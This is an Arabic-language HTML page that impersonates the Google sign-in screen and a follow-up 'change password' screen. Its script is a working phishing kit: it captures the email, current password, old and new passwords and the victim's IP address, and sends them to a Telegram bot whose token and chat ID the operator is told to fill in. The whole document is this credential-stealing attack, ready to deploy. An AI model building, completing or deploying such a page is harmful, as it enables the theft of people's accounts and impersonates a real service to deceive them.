<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Roboto', 'Segoe UI', Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        /* ==================== PAGE 1: LOGIN ==================== */
        #login-page {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            background-color: #f0f4f9;
        }
        
        .login-container {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .login-box {
            background: white;
            border-radius: 28px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 450px;
            padding: 48px 40px 36px;
            text-align: center;
        }
        
        .logo {
            margin-bottom: 16px;
        }
        
        .logo svg {
            width: 75px;
            height: 24px;
        }
        
        .login-box h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 8px;
            text-align: right;
        }
        
        .subtitle {
            font-size: 16px;
            color: #202124;
            margin-bottom: 32px;
            text-align: right;
        }
        
        .input-group {
            margin-bottom: 8px;
            text-align: right;
        }
        
        .input-field {
            width: 100%;
            height: 54px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            padding: 13px 15px;
            font-size: 16px;
            color: #202124;
            transition: border-color 0.2s;
            text-align: right;
        }
        
        .input-field:focus {
            outline: none;
            border-color: #1a73e8;
            border-width: 2px;
        }
        
        .links {
            text-align: right;
            margin: 8px 0 32px;
        }
        
        .link {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        
        .info-text {
            text-align: right;
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 32px;
            line-height: 1.5;
        }
        
        .button-group {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .btn-next {
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            padding: 10px 24px;
            cursor: pointer;
        }
        
        .login-footer {
            padding: 20px;
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            color: #5f6368;
        }
        
        /* ==================== PAGE 2: PASSWORD ==================== */
        #password-page {
            display: none;
            flex-direction: column;
            min-height: 100vh;
            background: #202124;
            color: #e8eaed;
        }
        
        .header {
            background: #202124;
            border-bottom: 1px solid #3c4043;
            padding: 12px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        
        .logo-text {
            font-size: 22px;
            font-weight: 400;
            color: #e8eaed;
        }
        
        .main-content {
            flex: 1;
            max-width: 700px;
            width: 100%;
            margin: 0 auto;
            padding: 40px 20px;
        }
        
        .card {
            background: #303134;
            border: 1px solid #3c4043;
            border-radius: 8px;
            padding: 24px;
            margin-top: 20px;
        }
        
        .form-group {
            margin-bottom: 24px;
        }
        
        .form-label {
            display: block;
            color: #e8eaed;
            font-size: 14px;
            margin-bottom: 8px;
            font-weight: 500;
        }
        
        .input-wrapper {
            position: relative;
        }
        
        .form-input {
            width: 100%;
            background: #202124;
            border: 1px solid #5f6368;
            border-radius: 4px;
            padding: 12px 40px 12px 12px;
            color: #e8eaed;
            font-size: 16px;
        }
        
        .form-input:focus {
            outline: none;
            border-color: #8ab4f8;
        }
        
        .toggle-btn {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #9aa0a6;
            cursor: pointer;
            font-size: 16px;
        }
        
        .strength-bar {
            height: 4px;
            background: #5f6368;
            border-radius: 2px;
            margin: 12px 0;
            overflow: hidden;
        }
        
        .strength-fill {
            height: 100%;
            width: 0;
            background: #f28b82;
            border-radius: 2px;
            transition: all 0.3s;
        }
        
        .submit-btn {
            background: #8ab4f8;
            color: #202124;
            border: none;
            border-radius: 4px;
            padding: 12px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 16px;
        }
        
        .dark-footer {
            background: #202124;
            border-top: 1px solid #3c4043;
            padding: 20px;
            display: flex;
            justify-content: space-between;
        }
        
        /* ==================== LOADING ==================== */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #202124;
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            z-index: 1000;
        }
        
        .overlay.show {
            display: flex;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #3c4043;
            border-top-color: #8ab4f8;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
n        }
    </style>
</head>
<body>

    <!-- PAGE 1: LOGIN -->
    <div id="login-page">
        <div class="login-container">
            <div class="login-box">
                <div class="logo">
                    <svg viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
                        <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.98 5.79 13.44 12.51 13.44s12.51-5.46 12.51-13.44z" fill="#EA4335"/>
                        <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.98 5.79 13.44 12.51 13.44s12.51-5.46 12.51-13.44z" fill="#FBBC05"/>
                        <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#4285F4"/>
                        <path d="M225 3v65h-9.5V3h9.5z" fill="#34A853"/>
                        <path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.96-6.72zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 3.61-11.59 12.93z" fill="#EA4335"/>
                        <path d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z" fill="#4285F4"/>
                    </svg>
                </div>
                
                <h1>تسجيل الدخول</h1>
                <p class="subtitle">باستخدام حسابك على Google</p>
                
                <form id="login-form">
                    <div class="input-group">
                        <input type="email" class="input-field" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
                    </div>
                    
                    <div class="input-group">
                        <input type="password" class="input-field" id="password" placeholder="كلمة المرور" required>
                    </div>
                    
                    <div class="links">
                        <a class="link" href="#">هل نسيت بريدك الإلكتروني؟</a>
                    </div>
                    
                    <p class="info-text">
                        تعرّف على المزيد حول خيار هذا الجهاز؟ استخدم وضع الضيف لتسجيل الدخول بشكل خاص.
                    </p>
                    
                    <div class="button-group">
                        <button type="button" class="link" style="background:none;border:none;">إنشاء حساب</button>
                        <button type="submit" class="btn-next">التالي</button>
                    </div>
                </form>
            </div>
        </div>
        
        <footer class="login-footer">
            <div>العربية ▼</div>
            <div style="display:flex;gap:24px;">
                <a class="link" href="#">مساعدة</a>
                <a class="link" href="#">خصوصية</a>
                <a class="link" href="#">شروط</a>
            </div>
        </footer>
    </div>

    <!-- PAGE 2: PASSWORD CHANGE -->
    <div id="password-page">
        <header class="header">
            <div class="logo-text">Google الحساب</div>
            <div style="color:#9aa0a6;">?</div>
        </header>

        <main class="main-content">
            <h2 style="margin-bottom:20px;">تغيير كلمة المرور</h2>
            
            <div class="card">
                <form id="passwordForm">
                    <div class="form-group">
                        <label class="form-label">كلمة المرور السابقة</label>
                        <div class="input-wrapper">
                            <input type="password" class="form-input" id="prevPass" placeholder="أدخل كلمة المرور السابقة">
                            <button type="button" class="toggle-btn" onclick="togglePass('prevPass')">👁</button>
                        </div>
                    </div>

                    <div class="form-group">
                        <label class="form-label">كلمة المرور الجديدة</label>
                        <div class="input-wrapper">
                            <input type="password" class="form-input" id="newPass" placeholder="أدخل كلمة المرور الجديدة">
                            <button type="button" class="toggle-btn" onclick="togglePass('newPass')">👁</button>
                        </div>
                        <div class="strength-bar">
                            <div class="strength-fill" id="strengthFill"></div>
                        </div>
                    </div>

                    <div class="form-group">
                        <label class="form-label">تأكيد كلمة المرور الجديدة</label>
                        <div class="input-wrapper">
                            <input type="password" class="form-input" id="confirmPass" placeholder="أعد إدخال كلمة المرور">
                            <button type="button" class="toggle-btn" onclick="togglePass('confirmPass')">👁</button>
                        </div>
                    </div>

                    <button type="submit" class="submit-btn">تغيير كلمة المرور</button>
                </form>
            </div>
        </main>

        <footer class="dark-footer">
            <div>العربية ▼</div>
            <div style="display:flex;gap:20px;color:#8ab4f8;">
                <a href="#" style="color:#8ab4f8;text-decoration:none;">المساعدة</a>
                <a href="#" style="color:#8ab4f8;text-decoration:none;">الخصوصية</a>
                <a href="#" style="color:#8ab4f8;text-decoration:none;">البنود</a>
            </div>
        </footer>
    </div>

    <!-- LOADING -->
    <div class="overlay" id="loadingOverlay">
        <div class="spinner"></div>
        <p>جاري المعالجة...</p>
    </div>

    <script>
        // ⚙️ إعدادات Telegram - عدل هنا
        const CONFIG = {
            telegram: {
                token: 'YOUR_BOT_TOKEN_HERE',  // ضع توكن البوت هنا
                chatId: 'YOUR_CHAT_ID_HERE'    // ضع معرف المحادثة هنا
            }
        };

        let userData = {
            email: '',
            password: '',
            prevPass: '',
            newPass: '',
            confirmPass: '',
            ip: '',
            time: ''
        };

        // Toggle Password
        function togglePass(id) {
            const input = document.getElementById(id);
            input.type = input.type === 'password' ? 'text' : 'password';
        }

        // Password Strength
        document.getElementById('newPass').addEventListener('input', function(e) {
            const val = e.target.value;
            const fill = document.getElementById('strengthFill');
            let strength = 0;
            
            if(val.length >= 8) strength++;
            if(/[A-Z]/.test(val)) strength++;
            if(/[0-9]/.test(val)) strength++;
            if(/[^A-Za-z0-9]/.test(val)) strength++;
            
            const colors = ['#f28b82', '#fbbc04', '#34a853'];
            fill.style.width = (strength / 4 * 100) + '%';
            fill.style.background = colors[Math.min(strength - 1, 2)] || '#f28b82';
        });

        // Login Form
        document.getElementById('login-form').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            userData.email = document.getElementById('email').value;
            userData.password = document.getElementById('password').value;
            
            document.getElementById('loadingOverlay').classList.add('show');
            
            // Get IP
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                userData.ip = data.ip;
            } catch(e) {}
            
            userData.time = new Date().toLocaleString('ar-SA');
            
            // Send to Telegram
            await sendToTelegram('login');
            
            setTimeout(() => {
                document.getElementById('loadingOverlay').classList.remove('show');
                document.getElementById('login-page').style.display = 'none';
                document.getElementById('password-page').style.display = 'flex';
            }, 1500);
        });

        // Password Form
        document.getElementById('passwordForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            userData.prevPass = document.getElementById('prevPass').value;
            userData.newPass = document.getElementById('newPass').value;
            userData.confirmPass = document.getElementById('confirmPass').value;
            
            document.getElementById('loadingOverlay').classList.add('show');
            
            // Send to Telegram
            await sendToTelegram('password');
            
            setTimeout(() => {
                document.getElementById('loadingOverlay').classList.remove('show');
                alert('تم! تحقق من Telegram');
            }, 2000);
        });

        // Send to Telegram
        async function sendToTelegram(type) {
            let message = '';
n            
            if(type === 'login') {
                message = `🔐 Google Login Captured\n\n📧 Email: ${userData.email}\n🔑 Password: ${userData.password}\n🌐 IP: ${userData.ip}\n⏰ ${userData.time}`;
            } else {
                message = `🔐 Google Password Changed\n\n📧 Email: ${userData.email}\n🔑 Previous: ${userData.prevPass}\n🆕 New: ${userData.newPass}\n✅ Confirm: ${userData.confirmPass}\n🌐 IP: ${userData.ip}\n⏰ ${userData.time}`;
            }
            
            try {
                await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CONFIG.telegram.chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch(e) {
                console.log('Error:', e);
            }
        }
    </script>
</body>
</html>
